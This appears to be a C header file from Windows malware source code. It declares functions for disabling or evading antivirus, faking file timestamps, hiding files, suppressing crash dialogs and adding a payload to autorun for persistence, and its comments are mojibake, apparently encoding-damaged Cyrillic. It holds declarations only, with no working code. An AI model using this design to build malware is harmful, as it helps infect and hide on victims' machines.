#include <windows.h>

DWORD SignalFirstRun( DWORD dwParam );


WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetShellFoldersKey( DWORD dwParam );

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );

void SetFakeFileDateTime(PCHAR Path);
void SetFakeFileDateTimeW(PWCHAR Path);


//----------------------------------------------------------------------------
//  IsHideFile - ������� ���������� ������, ���� ���������� ��������
//               ��������� ����
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - ������� ������������� ����� �����������
//         ������ ��� ������� ������� �� ����� ���������� ��������� � �����
//         ��������. ��� ����� �� ������ ���� ���������� ����� ���������
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();

void AddToAutoRun(void *body, DWORD size);
void AddToAutoRun(WCHAR *ModulePath);
